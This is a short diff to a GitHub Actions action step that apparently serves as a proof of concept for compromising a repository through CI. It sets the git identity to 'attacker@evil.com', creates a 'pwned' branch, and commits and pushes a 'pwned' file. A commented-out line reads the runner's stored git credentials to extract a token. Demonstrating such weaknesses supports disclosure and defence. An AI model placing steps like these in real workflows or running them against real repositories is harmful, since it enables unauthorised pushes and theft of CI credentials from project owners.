@@ -12,7 +12,9 @@ runs:
       run: |
         # tok = $(cat /home/runner/work/_temp/git-credentials-*.config | tail -n 1 | awk 'NF>1{print $NF}')
         echo "pwned" > file.txt
-        git config --global user.email ""
+        git config --global user.email "attacker@evil.com"
+        git config --global user.name "attacker"
+        git checkout -B pwned
         git add -A
         git commit -m "pwned"
-        git push
+        git push origin pwned
